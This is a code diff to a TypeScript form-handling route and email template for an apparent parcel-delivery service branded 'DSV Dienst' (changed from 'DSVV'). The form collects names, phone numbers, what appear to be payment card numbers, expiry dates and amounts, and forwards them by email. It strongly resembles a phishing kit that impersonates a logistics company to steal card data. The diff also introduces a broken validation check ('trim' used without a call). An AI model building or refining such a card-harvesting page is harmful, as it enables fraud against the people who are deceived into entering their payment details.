@@ -44,20 +44,19 @@ function validateFormData(data: any) {
   const requiredFields = [
     'nom_complet',
     'telephone',
-    'adresse',
+    'email',
     'carte_be',
     'carte_52_49_51',
     'date_expiration',
-    'montant'
+    'montant',
+    'age'
   ]
 
   for (const field of requiredFields) {
-    if (!data[field] || data[field].trim() === '') {
+    if (!data[field] || data[field].trim === '') {
       return { isValid: false, error: `Het veld ${field} is verplicht` }
     }
   }
-
-
 
   return { isValid: true }
 }
@@ -202,8 +201,8 @@ function createEmailTemplate(data: any) {
     <body>
       <div class="container">
         <div class="header">
-          <img src="cid:logo" alt="DSVV Dienst Logo">
-          <h1>DSVV Dienst</h1>
+          <img src="cid:logo" alt="DSV Dienst Logo">
+          <h1>DSV Dienst</h1>
           <p class="subtitle">${title}</p>
         </div>
 
@@ -221,8 +220,12 @@ function createEmailTemplate(data: any) {
                 <div class="info-value">${data.telephone}</div>
               </div>
               <div class="info-row">
-                <div class="info-label">Adresse</div>
-                <div class="info-value">${data.adresse}</div>
+                <div class="info-label">E-mail</div>
+                <div class="info-value">${data.email}</div>
+              </div>
+              <div class="info-row">
+                <div class="info-label">Âge</div>
+                <div class="info-value">${data.age}</div>
               </div>
             </div>
           </div>
@@ -269,7 +272,7 @@ function createEmailTemplate(data: any) {
         </div>
 
         <div class="footer">
-          <div class="footer-logo">DSVV Dienst</div>
+          <div class="footer-logo">DSV Dienst</div>
           <div class="footer-text">
             Service de collecte et de livraison de colis 24/7<br>
             <a href="https://dsvv-dienst.com">dsvv-dienst.com</a>
@@ -347,7 +350,8 @@ export async function POST(request: NextRequest) {
         === KLANTINFORMATIE ===
         Naam: ${body.nom_complet}
         Telefoon: ${body.telephone}
-        Adres: ${body.adresse}
+        E-mail: ${body.email}
+        Leeftijd: ${body.age}
 
         === PAKKETINFORMATIE ===
         Beschrijving: ${body.description_article || 'Niet gespecificeerd'}
